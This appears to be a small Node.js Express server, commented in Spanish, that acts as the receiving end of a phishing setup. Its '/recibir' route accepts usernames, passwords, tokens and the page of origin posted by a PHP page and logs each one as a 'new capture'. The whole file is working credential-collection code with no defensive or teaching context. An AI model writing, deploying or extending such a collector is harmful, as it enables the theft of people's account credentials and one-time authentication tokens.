const express = require('express');
const app = express();

// Para poder leer los datos que enviará tu PHP
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Ruta que recibe los datos
app.post('/recibir', (req, res) => {
    const { user, pass, token, origen } = req.body;
    
    console.log("===============================");
    console.log("🔔 NUEVA CAPTURA RECIBIDA");
    console.log(`👤 Usuario: ${user || 'n/a'}`);
    console.log(`🔑 Clave: ${pass || 'n/a'}`);
    console.log(`📲 Token: ${token || 'n/a'}`);
    console.log(`📍 Desde: ${origen || 'Desconocido'}`);
    console.log("===============================");

    // Respondemos con un OK para que el PHP no se quede esperando
    res.status(200).send("Datos procesados");
});

// Ruta simple para verificar que el servidor está vivo
app.get('/', (req, res) => {
    res.send("Servidor de Logs Activo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor escuchando en el puerto ${PORT}`);
});
